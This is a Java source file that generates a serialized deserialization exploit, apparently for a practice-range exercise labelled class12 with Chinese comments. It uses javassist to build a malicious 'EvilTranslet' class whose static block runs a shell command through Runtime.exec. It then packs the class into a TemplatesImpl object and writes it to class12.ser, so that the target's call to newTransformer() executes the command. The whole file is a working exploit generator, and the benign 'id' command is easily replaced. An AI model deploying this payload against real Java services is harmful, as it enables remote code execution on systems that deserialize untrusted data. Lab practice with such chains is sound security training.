package class12;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

/**
 * 生成 class12 的 payload — TemplatesImpl
 * 目标: 上传 TemplatesImpl 对象，靶场调用 templates.newTransformer()
 *       触发恶意类的静态代码块执行命令
 * 靶场: /class12/upload
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EvilTranslet");
        ctClass.setSuperclass(pool.get(
            "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

        // 静态代码块：类加载时执行命令
        ctClass.makeClassInitializer().setBody(
            "try {" +
            "   Runtime.getRuntime().exec(\"id\");" +
            "} catch (Exception e) {" +
            "   e.printStackTrace();" +
            "}"
        );

        // 重写 postInitialization() 为空方法，防止父类构造函数中空指针
        CtMethod m = CtNewMethod.make(
            "protected void postInitialization() {};", ctClass);
        ctClass.addMethod(m);

        byte[] evilBytes = ctClass.toBytecode();

        // 构造 TemplatesImpl
        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_bytecodes", new byte[][]{evilBytes});
        setField(templates, "_tfactory", new TransformerFactoryImpl());
        setField(templates, "_transletIndex", 0);
        setField(templates, "_name", "EvilTranslet");

        ObjectOutputStream oos = new ObjectOutputStream(
            new FileOutputStream("class12.ser"));
        oos.writeObject(templates);
        oos.close();

        System.out.println("✅ 已生成: class12.ser");
    }

    private static void setField(Object obj, String name, Object val) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, val);
    }
}
